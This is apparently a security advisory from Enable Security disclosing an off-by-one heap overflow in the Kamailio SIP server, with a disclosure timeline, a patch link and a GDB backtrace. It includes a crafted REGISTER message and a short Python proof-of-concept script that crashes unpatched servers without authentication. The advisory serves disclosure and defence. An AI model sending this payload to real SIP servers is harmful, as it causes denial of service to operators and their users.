# Off-by-one heap overflow in Kamailio

- Authors:
    - Alfred Farrugia <alfred@enablesecurity.com>
    - Sandro Gauci <sandro@enablesecurity.com>
- Fixed versions: Kamailio v5.1.2, v5.0.6 and v4.4.7
- References: no CVE assigned yet
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2018-05-kamailio-heap-overflow>
- Tested vulnerable versions: 5.1.1, 5.1.0, 5.0.0
- Timeline:
    - Report date: 2018-02-10
    - Kamailio confirmed issue: 2018-02-10
    - Kamailio patch: 2018-02-10
    - Kamailio release with patch: 2018-03-01
    - Enable Security advisory: 2018-03-19

## Description

A specially crafted REGISTER message with a malformed `branch` or `From tag` triggers an off-by-one heap overflow.

## Impact

Abuse of this vulnerability leads to denial of service in Kamailio. Further research may show that exploitation leads to remote code execution.

## How to reproduce the issue

The following SIP message was used to reproduce the issue with a `From` header containing the `tag` that triggers the vulnerability:


```
REGISTER sip:localhost:5060 SIP/2.0
Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394
To: <sip:1@localhost:5060>
From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg
Call-ID: 8b113457-c6a6-456a-be68-606686d93c38
Contact: sip:1@127.0.0.1:53497
Max-Forwards: 70
CSeq: 10086 REGISTER
User-Agent: go SIP fuzzer/1
Content-Length: 0

```

We used this python script to reproduce the crash:

```
#!/usr/bin/env python
import socket
import sys

PROTO = "udp"
SERVER_IP = "127.0.0.1"
SERVER_PORT = 5060

for _ in range(2):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.connect((sys.argv[1], int(sys.argv[2])))

    msg = "REGISTER sip:localhost:5060 SIP/2.0\r\n" \
        "Via: SIP/2.0/TCP 127.0.0.1:53497;branch=z9hG4bK0aa9ae17-25cb-4c3a-abc9-979ce5bee394\r\n" \
        "To: <sip:1@localhost:5060>\r\n" \
        "From: Test <sip:2@localhost:5060>;tag=bk1RdYaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaRg\r\n" \
        "Call-ID: 8b113457-c6a6-456a-be68-606686d93c38\r\n" \
        "Contact: sip:1@127.0.0.1:53497\r\n" \
        "Max-Forwards: 70\r\n" \
        "CSeq: 10086 REGISTER\r\n" \
        "User-Agent: go SIP fuzzer/1\r\n" \
        "Content-Length: 0\r\n" \
        "\r\n"

    sock.sendall(msg)
```


Run using:

```
python crash.py <ip> <port>
```

The expected result is a crash in Kamailio.

Notes: 

- authentication is not required
- SIP extension does not need to exist
- Message can be sent over TCP or UDP

### GDB backtrace result

Both crashes produce a similar backtrace in GDB:

```
#0  0x00007f08c3f16428 in __GI_raise (sig=sig@entry=6) at ../sysdeps/unix/sysv/linux/raise.c:54
#1  0x00007f08c3f1802a in __GI_abort () at abort.c:89
#2  0x0000000000669a6e in qm_debug_frag (qm=0x7f08ba615000, f=0x7f08ba8c70a8, file=0x7f08c0bba514 "tmx: tmx_pretran.c", line=250) at core/mem/q_malloc.c:147
#3  0x000000000066b49e in qm_malloc (qmp=0x7f08ba615000, size=136, file=0x7f08c0bba514 "tmx: tmx_pretran.c", func=0x7f08c0bbb320 <__func__.7497> "tmx_check_pretran", line=250, mname=0x7f08c0bba510 "tmx") at core/mem/q_malloc.c:380
#4  0x00000000006758e8 in qm_shm_malloc (qmp=0x7f08ba615000, size=136, file=0x7f08c0bba514 "tmx: tmx_pretran.c", func=0x7f08c0bbb320 <__func__.7497> "tmx_check_pretran", line=250, mname=0x7f08c0bba510 "tmx") at core/mem/q_malloc.c:1206
#5  0x00007f08c0baf879 in tmx_check_pretran (msg=0x7f08c37a3250) at tmx_pretran.c:250
#6  0x00007f08c0bac901 in t_precheck_trans (msg=0x7f08c37a3250) at tmx_mod.c:858
#7  0x00007f08c0bac939 in w_t_precheck_trans (msg=0x7f08c37a3250, p1=0x0, p2=0x0) at tmx_mod.c:869
#8  0x000000000047b0e4 in do_action (h=0x7fff808ef7e0, a=0x7f08c374e6c0, msg=0x7f08c37a3250) at core/action.c:1067
#9  0x0000000000487df1 in run_actions (h=0x7fff808ef7e0, a=0x7f08c374e6c0, msg=0x7f08c37a3250) at core/action.c:1565
#10 0x00000000004884a7 in run_actions_safe (h=0x7fff808f0860, a=0x7f08c374e6c0, msg=0x7f08c37a3250) at core/action.c:1633
#11 0x0000000000446725 in rval_get_int (h=0x7fff808f0860, msg=0x7f08c37a3250, i=0x7fff808efb44, rv=0x7f08c374e818, cache=0x0) at core/rvalue.c:912
#12 0x000000000044ae11 in rval_expr_eval_int (h=0x7fff808f0860, msg=0x7f08c37a3250, res=0x7fff808efb44, rve=0x7f08c374e810) at core/rvalue.c:1910
#13 0x000000000047aba7 in do_action (h=0x7fff808f0860, a=0x7f08c374f3b0, msg=0x7f08c37a3250) at core/action.c:1043
#14 0x0000000000487df1 in run_actions (h=0x7fff808f0860, a=0x7f08c374f3b0, msg=0x7f08c37a3250) at core/action.c:1565
#15 0x000000000047b050 in do_action (h=0x7fff808f0860, a=0x7f08c374f650, msg=0x7f08c37a3250) at core/action.c:1058
#16 0x0000000000487df1 in run_actions (h=0x7fff808f0860, a=0x7f08c374b610, msg=0x7f08c37a3250) at core/action.c:1565
#17 0x00000000004885b3 in run_top_route (a=0x7f08c374b610, msg=0x7f08c37a3250, c=0x0) at core/action.c:1654
#18 0x000000000059c7dc in receive_msg (
    buf=0xa48120 <buf> "REGISTER sip:127.0.0.1:5060 SIP/2.0\r\nVia: SIP/2.0/TCP 127.0.0.1:51315;branch=z340282366920938463463374607431768211455hG4bKecc-65715664045141690323692c170141183460469231731687303715884105859-4b6d-48dc-"..., len=608,
    rcv_info=0x7fff808f0c20) at core/receive.c:277
#19 0x00000000004a7b7c in udp_rcv_loop () at core/udp_server.c:554
#20 0x00000000004232d0 in main_loop () at main.c:1626
#21 0x000000000042a97a in main (argc=7, argv=0x7fff808f12d8) at main.c:2646
(gdb)
```

This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.

## Solutions and recommendations

Apply the patch at <https://github.com/kamailio/kamailio/commit/e1d8008a09d9390ebaf698abe8909e10dfec4097> or make use of a release that includes that patch (e.g. v5.1.2, v5.0.6 or v4.4.7).

Enable Security would like to thank Daniel-Constantin Mierla of the Kamailio Project for the very quick response and fix within hours of our report.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
